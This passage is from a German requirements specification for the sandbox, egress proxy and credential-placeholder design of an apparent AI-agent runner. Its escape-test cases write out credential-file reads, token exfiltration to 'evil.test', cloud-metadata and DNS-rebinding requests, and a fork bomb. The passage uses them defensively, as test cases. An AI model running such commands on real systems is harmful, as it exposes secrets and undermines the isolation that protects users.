  - [ ] AC3 — bwrap-Argumente enthalten keine Env-Werte (kein `--setenv` für Secrets/Platzhalter-Zuordnungen).
- **Abhängigkeiten:** SBX-008

### SBX-010 — Capability-Probe & `beton sandbox`-CLI
- **Meilenstein:** M2 · **Priorität:** Must
- **Beschreibung:** `beton sandbox probe|explain|exec|test` macht den Sandbox-Zustand transparent: Probe der Backends (Kernel/Landlock-ABI, User-NS, seccomp, bwrap, `sandbox-exec`, Docker/Podman), Ausgabe der aufgelösten Policy, manuelles Ausführen eines Kommandos in Stufe 1/2 und Lauf der Escape-Suite auf dem lokalen System. `beton doctor` (OBS-005, siehe 11-platform-features.md) bindet die Probe ein.
- **Akzeptanzkriterien:**
  - [ ] AC1 — `beton sandbox probe --json` liefert pro Backend `available`, `caps`, `degraded_reasons` und (Linux) `landlock_abi`, `kernel`.
  - [ ] AC2 — `beton sandbox exec --stage tools -- cat ~/.ssh/config` scheitert mit Exit ≠ 0 und klarer Meldung.
  - [ ] AC3 — `beton sandbox test` führt die Escape-Suite lokal aus und endet mit Exit 0 nur, wenn alle Pflichtfälle bestanden sind.
- **Abhängigkeiten:** SBX-001, SBX-011, OBS-005 (siehe 11-platform-features.md)

### SBX-011 — Sandbox-Escape-Testsuite
- **Meilenstein:** M2 · **Priorität:** Must
- **Beschreibung:** Eine deklarative Testsuite (`crates/beton-sandbox/tests/escape/*.yaml`) führt einen Probe-Binary (`bt-escape-probe`) in beiden Stufen aus und erwartet für jeden Angriff ein Scheitern. Sie läuft in CI pro OS (macOS arm64 aktuell und Vorversion; Ubuntu 22.04, Ubuntu 24.04 mit AppArmor-Restriktion, Debian 12, Fedora aktuell; Windows-Beta-Teilmenge ab M5; Docker ab M5) mit gefälschtem `HOME` voller Fixture-Secrets. Fehlschläge blockieren den Merge. SBX-011 ist Owner von Suite, Probe-Binary und Plattform-Matrix; Einbindung als Required Check und Reporting regelt QA-005.
- **Details:** Pflichtfälle (Auszug): `~/.ssh/id_ed25519` lesen; `~/.aws/credentials` lesen; Vendor-Credential in Stufe 2 lesen; `/etc` schreiben; außerhalb Workspace schreiben; `.git/hooks` schreiben; Symlink im Workspace auf `~/.ssh` lesen; `/proc/<runner>/environ` lesen; Env auf Secrets prüfen; `curl https://evil.test` (Regel fehlt); `curl http://169.254.169.254/`; Direktverbindung an LAN-IP ohne Proxy; DNS-Rebinding-Host (Test-Resolver liefert erst öffentliche, dann `127.0.0.1`); Platzhalter an fremden Host; Keychain/Secret-Service in Stufe 2; ptrace/kill des Runners; Fork-Bombe (Limit greift); Docker-Socket; `mount`/`unshare`.
- **Akzeptanzkriterien:**
  - [ ] AC1 — Die CI-Matrix enthält die oben genannten Plattformen; jeder Pflichtfall erscheint als eigener Testfall im Report.
  - [ ] AC2 — Ein absichtlich gelockertes Profil (Test-Fixture ohne Maske für `~/.ssh`) lässt den zugehörigen Fall rot werden (Mutationstest der Suite).
  - [ ] AC3 — Fixture-Secrets tauchen in keinem CI-Log und keinem Session-Event auf (Grep auf Testartefakte).
  - [ ] AC4 — Neue Backends gelten erst als verfügbar, wenn sie die Suite (bzw. die dokumentierte Teilmenge bei Beta) bestehen.
- **Abhängigkeiten:** SBX-002, SBX-004, SBX-005, SBX-007, SBX-008, PRX-003, PRX-006, PRX-007, QA-005, QA-010 (siehe 12-distribution-quality.md)
- **Referenz:** ADR-0031 (Sandbox-Escape-Tests pro OS)

### SBX-012 — Eingebaute Presets
- **Meilenstein:** M2 · **Priorität:** Should
- **Beschreibung:** Presets liefern sinnvolle Startpunkte: `default` (Workspace rw, kein Netz außer Stufe-1-Vendor-Hosts), `dev` (zusätzlich lesender Zugriff auf gängige Paket-Registries und Toolchain-Caches), `readonly` (Workspace ro, kein Netz; z. B. für Side-Chats und Reviewer-Agents). Eigene Felder überschreiben bzw. ergänzen Presets gemäß Merge-Regeln.
- **Details:** `dev`-Egress: `GET,HEAD` auf `registry.npmjs.org`, `registry.yarnpkg.com`, `pypi.org`, `files.pythonhosted.org`, `index.crates.io`, `static.crates.io`, `proxy.golang.org`, `sum.golang.org`, `codeload.github.com`, `objects.githubusercontent.com`; Read-Grants für `~/.cargo/registry`, `~/.npm/_cacache`, `~/.cache/pip`, `~/go/pkg/mod`, Write für deren Caches.
- **Akzeptanzkriterien:**
  - [ ] AC1 — Mit `preset: dev` gelingt `npm install` eines öffentlichen Pakets; `npm publish` scheitert (PUT nicht erlaubt).
  - [ ] AC2 — Mit `preset: readonly` scheitert jedes Schreiben im Workspace.
  - [ ] AC3 — `beton sandbox explain` zeigt, welche Werte aus dem Preset und welche aus eigener Konfiguration stammen.
- **Abhängigkeiten:** SBX-003, PRX-003

### SBX-013 — Ressourcenlimits & Prozessbaum-Lebenszyklus
- **Meilenstein:** M2 · **Priorität:** Should
- **Beschreibung:** Sandbox-Prozessbäume sind begrenzbar (Speicher, Prozessanzahl, CPU-Zeit, Dateigröße) und werden bei Session-Ende, Interrupt-Eskalation oder Runner-Absturz vollständig beendet. Linux nutzt cgroup v2 über systemd-User-Delegation, falls verfügbar, sonst rlimits; PID-Namespace garantiert das Aufräumen. macOS nutzt rlimits und Prozessgruppen-/Nachfahren-Erfassung.
- **Details:** Restrisiko macOS: per `setsid` daemonisierte Prozesse bleiben in der Sandbox gefangen (Profil wird vererbt), werden aber nur best effort beendet; dokumentiert.
- **Akzeptanzkriterien:**
  - [ ] AC1 — Eine Fork-Bombe in Stufe 2 mit `limits.pids: 256` wird begrenzt; der Host bleibt bedienbar, die Session meldet `sandbox.violation {kind: "limit"}`.
  - [ ] AC2 — Nach `session stop` existiert unter Linux kein Prozess der Session mehr (PID-NS leer); unter macOS sind alle per Nachfahren-Erfassung bekannten Prozesse beendet.
  - [ ] AC3 — `limits.memory_mb` wird unter Linux mit cgroup-Delegation durchgesetzt (OOM des Tools, nicht des Runners); ohne Delegation meldet die Probe `resources: degraded`.
- **Abhängigkeiten:** SBX-007, SBX-008

### SBX-014 — Verstoß-Reporting
- **Meilenstein:** M2 · **Priorität:** Could
- **Beschreibung:** Erkennbare Sandbox-Verstöße werden als Event `sandbox.violation {stage, kind: fs|net|syscall|limit|proxy_down, target, ts}` gemeldet und in der UI an der verursachenden Tool-Card angezeigt, damit Nutzer gezielt Grants ergänzen können („Pfad freigeben?“ → Vorschlag für Projekt-Konfiguration, nie automatisch). Quellen: Proxy-Denies (immer), macOS-Sandbox-Log (best effort), Landlock-Audit (Kernel ≥ 6.15, best effort), seccomp-EPERM nur indirekt.
- **Akzeptanzkriterien:**
  - [ ] AC1 — Ein geblockter HTTP-Request erzeugt ein Event mit Host, Methode, Pfad (ohne Query) und der Tool-Call-ID.
  - [ ] AC2 — Der UI-Vorschlag „Regel hinzufügen“ schreibt erst nach Bestätigung in `.beton/config.yaml`.
  - [ ] AC3 — Verstoß-Events werden pro Session auf 10/s begrenzt, Überzählige als `suppressed_count` zusammengefasst.
- **Abhängigkeiten:** SBX-007, SBX-008, PRX-009

### SBX-015 — Docker/Podman-Backend
- **Meilenstein:** M5 · **Priorität:** Must
- **Beschreibung:** Stärkste plattformübergreifende Option (auch Windows/macOS via Docker Desktop, rootless Podman bevorzugt). Pro Session zwei Container aus demselben Image: `bt-<sid>-harness` (Stufe 1, mit verschlüsseltem Credential-Volume des Vendors, siehe RUN-015 in 10-runners-extensibility.md) und `bt-<sid>-tools` (Stufe 2, ohne Credential-Volume); der Exec-Broker führt Stufe-2-Kommandos per `exec` im Tools-Container aus. Workspace als Bind-Mount bzw. Volume. Abgrenzung: SBX-015 ist Owner des Isolations-Backends (`sandbox.backend: docker|podman`) und der Container-Härtung; RUN-008 ist Owner des Docker-RunnerProviders (wo der Runner läuft) und nutzt dieselbe Härtung.
- **Details:** Flags: `--cap-drop=ALL`, `--security-opt no-new-privileges`, Default-seccomp-Profil, `--read-only` Root-FS + tmpfs `/tmp`, `--user <uid>:<gid>`, `--pids-limit`, `--memory`, kein Docker-Socket. Netz: Linux nativ `--network none` + gemounteter Proxy-Unix-Socket + Relay im Container; Docker Desktop: `--internal`-Netz mit Relay-Sidecar, der zum Host-Proxy (Proxy-Auth-Token) weiterleitet. Masken als tmpfs- bzw. `/dev/null`-Mounts.
- **Akzeptanzkriterien:**
  - [ ] AC1 — Die Escape-Suite besteht mit `backend: docker` und `backend: podman` (rootless) auf Linux sowie mit Docker Desktop auf macOS.
  - [ ] AC2 — Aus dem Tools-Container ist das Credential-Volume des Harness-Containers nicht erreichbar.
  - [ ] AC3 — Ohne laufenden Docker-Daemon liefert `backend: docker` `sandbox_unavailable` (kein Fallback).
  - [ ] AC4 — `docker inspect` des Tools-Containers zeigt keine Secret-Werte in Env oder Labels.
- **Abhängigkeiten:** SBX-002, PRX-008, RUN-008, RUN-015 (siehe 10-runners-extensibility.md)

### SBX-016 — Windows-Beta-Backend
- **Meilenstein:** M5 · **Priorität:** Must
- **Beschreibung:** Best-effort-Isolation über dem Omnigent-Niveau: Stufe 1 läuft mit Restricted Token (Admin-SIDs deny-only, Privilegien entfernt) in einem Job Object (`KILL_ON_JOB_CLOSE`, Prozess-/Speicherlimits, UI-Restriktionen); Stufe 2 zusätzlich in einem **AppContainer** ohne Capabilities, dem der Runner per ACE gezielt Zugriff auf Workspace und Scratch gewährt (beim Session-Ende entfernt). Die Beta wird in UI und Doku als solche gekennzeichnet.
- **Details:** **Nicht isoliert** (dokumentiert, in `probe` als `degraded`): Netzwerk in Stufe 1 (kein Proxy-Zwang); Netz-Egress über Proxy in Stufe 2 (AppContainer kann Loopback nicht ohne Admin-Ausnahme erreichen → Stufe 2 hat entweder **gar kein Netz** oder, mit `windows.allow_unenforced_network: true`, unkontrolliertes Netz mit nur gesetzten Proxy-Variablen); Lesezugriff von Stufe 1 auf das Benutzerprofil; Registry-Lesezugriffe; Named Pipes/ALPC anderer Prozesse; Dotfile-Masken innerhalb freigegebener Wurzeln. Empfehlung für volle Isolation: Docker-Backend oder WSL2.
- **Akzeptanzkriterien:**
  - [ ] AC1 — In Stufe 2 scheitern Lesen von `%USERPROFILE%\.ssh\id_ed25519` und Schreiben nach `C:\Windows\Temp\x` sowie außerhalb des Workspace.
  - [ ] AC2 — Mit `allow_network: true` und ohne `allow_unenforced_network` startet die Session nicht (`sandbox_unavailable`, `missing: ["net"]`).
  - [ ] AC3 — Schließen des Job-Handles (Runner-Absturz) beendet den gesamten Prozessbaum.
  - [ ] AC4 — Nach Session-Ende sind die hinzugefügten ACEs am Workspace wieder entfernt.
- **Abhängigkeiten:** SBX-001, SBX-002, SBX-011
- **Referenz:** Omnigent nur Job Object ohne FS-/Netz-Isolation (3.5.3)

### SBX-017 — PTY-/Native-TUI-Modus unter Sandbox
- **Meilenstein:** M3 · **Priorität:** Must
- **Beschreibung:** Auch im PTY-Modus (Original-Vendor-TUI, HAR-012 in 01-harnesses.md) läuft der Harness in Stufe 1; das PTY wird von `beton-pty` (Stufe 0) gehalten, der Kindprozess am PTY-Slave startet über `SandboxProvider::spawn`. Shell-Kommandos des Vendor-TUIs gehen über `bt-exec` in Stufe 2. Workspace-Terminals einer Session (SES-019, siehe 07-sessions-collaboration.md) laufen in Stufe 2.
- **Akzeptanzkriterien:**
  - [ ] AC1 — Im PTY-Modus von Claude Code scheitert `!cat ~/.ssh/id_ed25519` bzw. das Bash-Tool mit demselben Befehl.
  - [ ] AC2 — Ein User-Terminal der Session hat dieselben Netz- und FS-Grenzen wie Stufe 2 (Escape-Teilmenge im PTY-Test).
  - [ ] AC3 — Fenstergrößenänderungen und Ctrl+C erreichen den Prozess in der Sandbox.
- **Abhängigkeiten:** SBX-002, HAR-012 (siehe 01-harnesses.md), TUI-002 (siehe 08-clients.md), SES-019 (siehe 07-sessions-collaboration.md)

### PRX-001 — Proxy-Kern & Instanzmodell
- **Meilenstein:** M2 · **Priorität:** Must
- **Beschreibung:** `beton-proxy` ist ein HTTP/1.1-Forward-Proxy mit CONNECT auf Basis von tokio/hyper/rustls, der im Runner (Stufe 0) läuft. Jede Session-Stufe erhält eine eigene Proxy-Identität (Regeln, Bindings, Auth-Token); Requests ohne gültige `Proxy-Authorization` werden mit 407 abgewiesen. Endpunkte: Unix-Socket (Linux/Docker, über Relay) bzw. `127.0.0.1:<zufälliger Port>` (macOS, Windows).
- **Details:** Proxy-URL in der Sandbox: `http://bt:<token>@127.0.0.1:<port>`; Token 256 bit, pro Stufe und Session. Fehlerantworten tragen Header `X-Beton-Egress: denied|error` und JSON-Body `{error, reason, rule_hint?}`. Timeouts: Connect 10 s, Idle 120 s.
- **Akzeptanzkriterien:**
  - [ ] AC1 — Ein Request ohne bzw. mit fremdem Proxy-Token erhält 407 und wird nicht weitergeleitet.
  - [ ] AC2 — Zwei parallele Sessions mit unterschiedlichen Regeln beeinflussen sich nicht (Request erlaubt in A, verboten in B).
  - [ ] AC3 — Lasttest: 200 parallele HTTPS-Verbindungen einer Session funktionieren ohne Fehler; p99-Zusatzlatenz pro Request < 20 ms lokal (ohne TLS-Handshake-Erstkosten).
- **Abhängigkeiten:** SBX-001
- **Referenz:** ADR-0007; Omnigent `EgressProxy` (Python-asyncio)

### PRX-002 — beton-CA pro Installation & TLS-MITM
- **Meilenstein:** M2 · **Priorität:** Must
- **Beschreibung:** Beim ersten Start wird eine Root-CA (ECDSA P-256, Gültigkeit 2 Jahre, CN `beton egress CA <installation-id>`) erzeugt; der private Schlüssel liegt im Secret-Store (SEC-001, siehe 05-security-identity.md), nie als Klartextdatei. Für jeden erlaubten Host erzeugt der Proxy on-the-fly ein Leaf-Zertifikat (SAN = Host, 24 h, LRU-Cache); alle Leafs einer Proxy-Instanz teilen einen Schlüssel, sodass dessen SPKI-Hash für Chromium-Pinning stabil ist (PRX-011). Upstream-TLS wird strikt validiert (webpki + System-Roots + `proxy.extra_ca_files`).
- **Details:** Die CA wird nie in System-Trust-Stores installiert. Sandbox erhält ein kombiniertes Bundle (System-Roots + beton-CA) via Env (PRX-008). `beton proxy ca rotate` erzeugt eine neue CA; laufende Sessions behalten ihre bis zum Neustart. Upstream-Zertifikatsfehler → 502 `upstream_tls_error`, kein Override in Stufe 2.
- **Akzeptanzkriterien:**
  - [ ] AC1 — `curl https://example.com` in der Sandbox (mit Regel) validiert gegen die beton-CA; außerhalb der Sandbox ist die beton-CA in keinem System-Trust-Store zu finden.
  - [ ] AC2 — Ein Upstream mit selbstsigniertem bzw. abgelaufenem Zertifikat (Test-Server) führt zu 502, der Client sieht keine Verbindung zum Upstream.
  - [ ] AC3 — Der CA-Schlüssel ist nicht im Dateisystem unter `~/.beton` im Klartext auffindbar (Test durchsucht nach PEM-Key-Markern).
  - [ ] AC4 — Nach `beton proxy ca rotate` nutzen neue Sessions die neue CA; das Audit-Log enthält einen Eintrag.
- **Abhängigkeiten:** PRX-001, SEC-001, SEC-012 (siehe 05-security-identity.md)

### PRX-003 — Regel-Syntax & Matching (Default-Deny)
- **Meilenstein:** M2 · **Priorität:** Must
- **Beschreibung:** Egress-Regeln haben die Form `"METHODS host/path-glob"`. Ohne passende Allow-Regel wird jeder Request abgelehnt; Deny-Regeln (Präfix `!`) haben Vorrang vor Allow-Regeln. Gematcht wird gegen den entschlüsselten Request (Methode, Host, normalisierter Pfad); der CONNECT selbst wird vorab nur zugelassen, wenn mindestens eine Regel den Host:Port erlauben könnte.
- **Details:**
  ```
  rule      = [ "!" ] methods SP target *( SP target )
  methods   = "*" / method *( "," method )        ; GET HEAD POST PUT PATCH DELETE OPTIONS; "*" = alle sieben
  target    = [ "http://" ] host [ ":" port ] [ path-glob ]
  host      = fqdn / "*." fqdn / ip-literal      ; "*.x.com" = beliebige Subdomain, NICHT x.com selbst
  path-glob = "/" …                               ; "*" = ein Segment, "**" = beliebig tief, "?" = ein Zeichen; Default "/**"
  ```
  Schema: Default `https` (Port 443); Klartext-HTTP nur mit explizitem `http://` (Port 80). Hosts werden kleingeschrieben, IDN → Punycode, abschließender Punkt entfernt. Pfade: Percent-Decoding unreservierter Zeichen, `.`/`..` aufgelöst, `//` zusammengefasst; Pfade mit `%2F`, `%5C` oder Escape über die Wurzel → 400. Query wird ignoriert. `TRACE` und `CONNECT` innerhalb eines Tunnels werden immer abgelehnt. Regeln werden beim Laden kompiliert; ungültige Regeln sind ein Konfigurationsfehler.
- **Akzeptanzkriterien:**
  - [ ] AC1 — Deklarative Regeltests (`tests/egress/*.yaml`: Regeln + Request → Entscheidung) decken Methoden-Listen, `*.`-Hosts, `**`/`*`/`?`, Port, `http://`, Deny-Vorrang und Normalisierung ab und laufen in CI.
  - [ ] AC2 — Regel `GET api.github.com/repos/a/**`: `GET /repos/a/x` erlaubt; `GET /repos/a/../b/x` und `GET /repos/a%2F..%2Fb` abgelehnt.
  - [ ] AC3 — `*.example.com` erlaubt `a.example.com`, nicht `example.com` und nicht `example.com.evil.test`.
  - [ ] AC4 — `http://`-Requests ohne `http://`-Regel werden abgelehnt, auch wenn eine HTTPS-Regel für den Host existiert.
  - [ ] AC5 — CONNECT zu einem Host ohne jede Regel wird mit 403 abgelehnt, bevor ein TLS-Handshake stattfindet.
- **Abhängigkeiten:** PRX-001
- **Referenz:** Omnigent `rules.py` (3.5.3)

### PRX-004 — HTTP/2, WebSocket & Protokollgrenzen
- **Meilenstein:** M2 · **Priorität:** Must
- **Beschreibung:** Der Proxy bietet Clients per ALPN `h2` und `http/1.1` an und spricht upstream, was der Server unterstützt. Bei HTTP/2 wird **jeder Stream einzeln** gegen die Regeln geprüft; `:authority` muss dem CONNECT-Host entsprechen (sonst 421), damit Connection-Coalescing keine Regeln umgeht. WebSocket-Upgrades über HTTP/1.1 werden anhand des Upgrade-Requests geprüft und danach transparent weitergeleitet. gRPC (h2 mit Trailern) funktioniert.
- **Details:** Nicht unterstützt in v1 (sauber abgelehnt): Extended CONNECT (RFC 8441, `SETTINGS_ENABLE_CONNECT_PROTOCOL=0`), h2c, HTTP/3/QUIC (UDP ist ohnehin gesperrt; `Alt-Svc`-Header werden aus Antworten entfernt). Non-HTTP-TCP (SSH, Datenbanken) nur über Passthrough-Einträge `host:port` (PRX-005). Max. 100 gleichzeitige Streams pro Client-Verbindung.
- **Akzeptanzkriterien:**
  - [ ] AC1 — Über eine h2-Verbindung zu `api.github.com` wird ein erlaubter `GET` beantwortet und ein verbotener `DELETE` auf demselben Connection mit 403 (Stream-lokal) abgelehnt, ohne die Verbindung zu schließen.
  - [ ] AC2 — Ein h2-Request mit `:authority: other.example` auf einer Verbindung zu `allowed.example` erhält 421.
  - [ ] AC3 — Ein WebSocket zu einem erlaubten Host funktioniert (Echo-Test); zu einem nicht erlaubten Host scheitert der Upgrade mit 403.
  - [ ] AC4 — Antworten enthalten keinen `Alt-Svc`-Header.
- **Abhängigkeiten:** PRX-002, PRX-003

### PRX-005 — Passthrough für Vendor-Hosts (Stufe 1)
- **Meilenstein:** M2 · **Priorität:** Must
- **Beschreibung:** Damit beton Subscription-Tokens nie sieht (HAR-015, siehe 01-harnesses.md), werden die vom Adapter deklarierten Vendor-Hosts in Stufe 1 als **Passthrough** behandelt: CONNECT wird ohne TLS-Terminierung getunnelt, geprüft werden nur Host, Port, private IP (PRX-007) und dass die SNI im ClientHello dem CONNECT-Host entspricht. Weitere Stufe-1-Ziele (z. B. Remote-MCP-Server aus der Agent-Konfiguration) laufen normal über Regeln und MITM.
- **Details:** Adapter-Deklaration, z. B. Claude: `api.anthropic.com`, `claude.ai`, `console.anthropic.com`, `statsig.anthropic.com`; Codex: `api.openai.com`, `chatgpt.com`, `auth.openai.com` *(Annahme, pro Vendor-Release zu prüfen; erweiterbar über `sandbox.harness.egress_passthrough`)*. In Stufe 2 ist Passthrough nur über explizite Konfiguration `sandbox.egress_passthrough` möglich und wird im Audit vermerkt; Credential-Injection ist auf Passthrough-Verbindungen nie aktiv.
- **Akzeptanzkriterien:**
  - [ ] AC1 — Eine Claude-Code-Session mit Subscription funktioniert in Stufe 1; ein Proxy-Debug-Dump zeigt für `api.anthropic.com` keine entschlüsselten Header.
  - [ ] AC2 — Ein ClientHello mit SNI `evil.test` in einem CONNECT zu `api.anthropic.com` wird getrennt.
  - [ ] AC3 — Aus Stufe 2 ist `api.anthropic.com` ohne explizite Regel nicht erreichbar.
- **Abhängigkeiten:** PRX-001, SBX-002, HAR-015 (siehe 01-harnesses.md)

### PRX-006 — Credential-Injection mit Platzhaltern
- **Meilenstein:** M2 · **Priorität:** Must
- **Beschreibung:** Credentials werden als Bindings konfiguriert; die Sandbox sieht nur Platzhalter `bt_cred_<32×base32>` (160 bit, pro Session und Binding neu). Der Proxy ersetzt Platzhalter in Requests an gebundene Hosts durch den echten Wert im typgerechten Format oder injiziert ihn, wenn kein `Authorization`-Header vorhanden ist. Ein Platzhalter für einen nicht gebundenen Host führt zu 403 und einem Audit-Eintrag `credential.misuse`.
- **Details:**
  | Typ | Default-Hosts | Injektion |
  | --- | --- | --- |
  | `bearer` | (Pflichtfeld `hosts`) | `Authorization: Bearer <v>` |
  | `basic` | (Pflichtfeld `hosts`) | `Authorization: Basic base64(username:<v>)` |
  | `git_https` | (Pflichtfeld `hosts`) | Git-Credential-Helper in der Sandbox liefert Platzhalter als Passwort; Proxy ersetzt im Basic-Header |
  | `github` | `github.com`, `api.github.com`, `uploads.github.com`, `objects.githubusercontent.com` (GHE: `hosts: [ghe.example.com]`, API unter `/api/v3`) | Git: Basic `x-access-token:<v>`; API: `Authorization: Bearer <v>` (auch `token <v>` wird ersetzt) |
  | `gitlab` | `gitlab.com` (self-hosted: `hosts`) | Git: Basic `oauth2:<v>`; API: `Authorization: Bearer <v>` bzw. `PRIVATE-TOKEN: <v>` |

  Quellen (genau eine): `{secret: "secret://…"}` (Secret-Store, SEC-001 in 05-security-identity.md), `{env: NAME}` (Env des Daemons beim Session-Start), `{file: PATH}` (außerhalb aller Sandbox-Grants, keine Hardlinks, 0600 empfohlen, max. 64 KiB), `{command: [argv…], ttl: 15m}` (läuft in Stufe 0, Timeout 30 s, stdout getrimmt). Ersetzt wird in allen Request-Headern und in der URL (Pfad/Query), nie im Body; nie bei `TRACE` und nie auf Passthrough. Fehler der Quelle → 502 `credential_source_error`. `credentials[].env` setzt den Platzhalter in benannte Variablen (z. B. `GH_TOKEN`).
- **Akzeptanzkriterien:**
  - [ ] AC1 — `gh api user` und `git push` über HTTPS gelingen in Stufe 2 mit `type: github`; `env`, Prozessliste und Session-Events enthalten nur den Platzhalter.
  - [ ] AC2 — `curl -H "Authorization: Bearer $GH_TOKEN" https://evil.test/` (mit Regel für `evil.test`) erhält 403 `credential_host_mismatch`; der echte Token verlässt den Proxy nicht (Test-Upstream prüft eingehende Header).
  - [ ] AC3 — Ein unbekannter, syntaktisch gültiger Platzhalter wird mit 403 abgelehnt.
  - [ ] AC4 — `source.file` auf einen Pfad innerhalb eines Sandbox-Read-Grants wird bei der Auflösung abgelehnt.
  - [ ] AC5 — `source.command` mit `ttl: 1m` wird nach Ablauf neu ausgeführt; schlägt es fehl, erhält der Request 502 und kein veralteter Wert wird verwendet.
  - [ ] AC6 — Jede Nutzung erzeugt einen Audit-Eintrag (Binding-Name, Session, Host, Zähler pro 5-min-Fenster), nie den Wert.
- **Abhängigkeiten:** PRX-002, PRX-003, SEC-001, SEC-012 (siehe 05-security-identity.md)
- **Referenz:** ADR-0024; Omnigent Credential-Proxy (`oa_cred_*`, 3.5.3)

### PRX-007 — Private-IP- & DNS-Rebinding-Schutz
- **Meilenstein:** M2 · **Priorität:** Must
- **Beschreibung:** Der Proxy löst Hostnamen selbst auf, prüft **alle** Adressen und verbindet sich ausschließlich mit einer geprüften IP (keine zweite Auflösung). Nicht-globale Ziele sind gesperrt, außer sie stehen explizit in `egress_allow_private` (als `ip:port` oder `cidr:port`).
- **Details:** Gesperrt: `0.0.0.0/8`, `10/8`, `100.64/10`, `127/8`, `169.254/16` (inkl. Metadaten), `172.16/12`, `192.0.0/24`, `192.168/16`, `198.18/15`, Multicast/Broadcast, `168.63.129.16`, `::/128`, `::1`, `fc00::/7`, `fe80::/10`, IPv4-gemappte/-kompatible IPv6-Adressen privater Ziele, NAT64 `64:ff9b::/96` mit privatem Suffix. IP-Literale werden genauso geprüft. DNS-Fehler = Deny. Redirects folgt der Proxy nie selbst (der Client folgt und jeder Folge-Request wird neu geprüft).
- **Akzeptanzkriterien:**
  - [ ] AC1 — Mit Regel `* metadata.test/**` und Test-Resolver `metadata.test → 169.254.169.254` wird der Request abgelehnt (`private_destination`).
  - [ ] AC2 — DNS-Rebinding-Test: Resolver liefert für `rebind.test` abwechselnd `93.184.216.34` und `127.0.0.1`; keine Verbindung zu `127.0.0.1` kommt zustande.
  - [ ] AC3 — `http://[::ffff:10.0.0.1]/` und `http://2130706433/` werden abgelehnt.
  - [ ] AC4 — Mit `egress_allow_private: ["10.0.0.5:5432"]` ist genau dieses Ziel erreichbar, `10.0.0.5:22` nicht.
- **Abhängigkeiten:** PRX-001

### PRX-008 — Erzwingung „Netz nur zum Proxy“ & Toolchain-Integration
- **Meilenstein:** M2 · **Priorität:** Must
- **Beschreibung:** Die OS-Sandbox lässt ausschließlich Verbindungen zum Proxy zu: Linux über leeren Net-NS + Relay (SBX-008), macOS über SBPL-Netzregel auf `localhost:<port>` (SBX-007), Docker über `--network none`/internes Netz (SBX-015); Windows Beta siehe SBX-016. In die Sandbox werden Proxy- und CA-Variablen gesetzt, damit gängige Toolchains den Proxy nutzen und der beton-CA vertrauen.
- **Details:** Gesetzt: `HTTP_PROXY`, `HTTPS_PROXY`, `ALL_PROXY` (+ Kleinschreibung), `NO_PROXY` (Linux/Docker: `localhost,127.0.0.1,::1` — Loopback ist sandbox-lokal; macOS: leer), `SSL_CERT_FILE`, `REQUESTS_CA_BUNDLE`, `CURL_CA_BUNDLE`, `NODE_EXTRA_CA_CERTS`, `NODE_USE_ENV_PROXY=1` *(Annahme: Node ≥ 24)*, `GIT_SSL_CAINFO`, `PIP_CERT`, `CARGO_HTTP_CAINFO`, `AWS_CA_BUNDLE`, `DENO_CERT`; `SSL_CERT_DIR` wird entfernt. Bekannte Lücken (dokumentiert, scheitern **geschlossen** mit TLS-Fehler): Go-Binaries auf macOS (System-Verifier), Java ohne Truststore-Konfiguration.
- **Akzeptanzkriterien:**
  - [ ] AC1 — `curl`, `git`, `npm`, `pip`, `cargo` und Node-`fetch` erreichen über Regeln erlaubte Hosts in Stufe 2 ohne weitere Konfiguration (Integrationstest je Tool).
  - [ ] AC2 — Ein Tool, das Proxy-Variablen ignoriert und direkt verbindet, scheitert auf macOS und Linux (Escape-Test).
  - [ ] AC3 — Auf Linux erreicht ein Tool einen in derselben Sandbox gestarteten Dev-Server auf `127.0.0.1:3000`, aber keinen Host-Dienst auf `127.0.0.1`.
- **Abhängigkeiten:** SBX-007, SBX-008, PRX-002

### PRX-009 — Logging, Events & Audit des Egress
- **Meilenstein:** M2 · **Priorität:** Must
- **Beschreibung:** Jede Proxy-Entscheidung wird strukturiert geloggt (`tracing`): Session, Stufe, Methode, Host, Port, Pfad (ohne Query, max. 256 Zeichen), Entscheidung, auslösende Regel, Binding-Name, Status, Bytes, Dauer — nie Header-Werte oder Bodies. Denies erzeugen Events `egress.blocked`; erlaubter Verkehr wird minütlich als `egress.summary` (Host → Requests, Bytes) aggregiert; Credential-Nutzung geht ins Audit-Log (SEC-012, siehe 05-security-identity.md).
- **Akzeptanzkriterien:**
  - [ ] AC1 — Ein abgelehnter Request erzeugt ein `egress.blocked {method, host, path, reason, rule_hint, tool_call_id?}` im Session-Log.
  - [ ] AC2 — Weder Logs noch Events enthalten `Authorization`-, `Cookie`- oder Query-Werte (Test mit markierten Werten + Grep).
  - [ ] AC3 — `egress.summary` erscheint höchstens einmal pro Minute und Session und nur bei Verkehr.
  - [ ] AC4 — Audit-Einträge zur Credential-Nutzung sind über `beton audit list --kind credential` abrufbar.
- **Abhängigkeiten:** PRX-001, PROTO-002 (siehe 06-data-sync-protocol.md), SEC-012 (siehe 05-security-identity.md)

### PRX-010 — Antwort-Redaction echter Secret-Werte
- **Meilenstein:** M2 · **Priorität:** Should
- **Beschreibung:** Spiegelt ein Upstream einen injizierten Wert zurück (z. B. Debug-Endpunkte, Fehlermeldungen), ersetzt der Proxy ihn in Antwort-Headern und in textartigen Bodies (`text/*`, `application/json`, `application/xml`; bis 1 MiB, unkomprimiert oder gzip/br transparent) durch den Platzhalter, damit der echte Wert nie in die Sandbox gelangt.
- **Akzeptanzkriterien:**
  - [ ] AC1 — Ein Test-Upstream, der den `Authorization`-Header im JSON-Body echot, liefert in der Sandbox nur den Platzhalter.
  - [ ] AC2 — Binäre oder > 1 MiB große Bodies werden unverändert gestreamt (keine Pufferung), dokumentiert als Restrisiko.
- **Abhängigkeiten:** PRX-006

### PRX-011 — Browser-Traffic über den Proxy
- **Meilenstein:** M3 · **Priorität:** Must
- **Beschreibung:** Der eingebettete Chromium (BRW-003, siehe 09-browser.md) läuft mit eigener Proxy-Identität und eigenen Regeln (`sandbox.browser.egress_rules`, Default = Stufe-2-Regeln). Start mit `--proxy-server`, `--proxy-bypass-list=<-loopback>` (auch Loopback über den Proxy), `--ignore-certificate-errors-spki-list=<SPKI des Instanz-Leaf-Schlüssels>`, `--disable-quic` und WebRTC-Policy `disable_non_proxied_udp`; Proxy-Authentifizierung beantwortet beton über CDP `Fetch.authRequired`. Navigations-Policies (POL-020, BRW-019) greifen zusätzlich. PRX-011 ist Owner der Proxy-Anbindung des Browsers (Proxy-Identität, Start-Flags, Zertifikatsvertrauen); BRW-018 beschreibt die Browser-Sicht.
- **Akzeptanzkriterien:**
  - [ ] AC1 — Navigation zu einer Seite ohne passende Regel zeigt eine beton-Fehlerseite (403), und ein `egress.blocked` mit `source: browser` wird geloggt.
